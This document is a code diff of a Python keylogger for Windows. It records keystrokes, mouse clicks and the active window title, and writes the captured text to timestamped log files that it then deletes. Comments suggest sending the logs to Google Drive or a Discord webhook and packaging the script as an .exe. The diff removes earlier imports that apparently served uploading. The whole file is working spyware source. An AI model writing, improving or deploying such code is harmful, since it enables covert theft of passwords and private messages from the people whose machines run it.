@@ -1,8 +1,10 @@
-import pynput, threading, win32api, time, anonfile, os, win32gui, unidecode, json, urllib.request
+import pynput, threading, win32api, time, os, win32gui, unidecode
 
 loggedKeys = "" 
 storedKey = ""
 activeWindow = win32gui.GetWindowText(win32gui.GetForegroundWindow())
+
+os.chdir(os.path.dirname(__file__)) #remove if you are converting this program into .exe, use sys.executable instead
 
 def mouseget():
     global loggedKeys 
@@ -11,21 +13,22 @@ def mouseget():
         if win32api.GetKeyState(0x01) != state_left:
             state_left = win32api.GetKeyState(0x01)
             if win32api.GetKeyState(0x01) < 0: loggedKeys = loggedKeys + f" [Mouse.Left_Click] ".replace("'", "")
-        time.sleep(0.1)
+        time.sleep(0.02)
 
 def send():
     global loggedKeys, activeWindow
     while True:
-        time.sleep(60)
+        time.sleep(10) # change if you want
         timenow = time.strftime("%d-%m-%Y_%H-%M-%S")
-        try:
-            with open(f"log_{timenow}.txt", "w") as f:
-                f.write(loggedKeys)
 
-            # here you want to send the txt file somewhere. Maybe connect it to Google Drive or connect it to Discord via webhook?
-            
-            os.remove(f"log_{timenow}.txt")
-        except: pass
+        with open(f"log_{timenow}.txt", "w", encoding="utf-8") as f:
+            f.write(loggedKeys)
+            f.close()
+
+        print(loggedKeys) # only for testing, i recommend you to delete it after testing
+        # here you want to send the txt file somewhere. Maybe connect it to Google Drive or to Discord via webhook?
+
+        os.remove(f"log_{timenow}.txt") #and dont forget to delete it
         activeWindow = win32gui.GetWindowText(win32gui.GetForegroundWindow())
 
 def windowget():
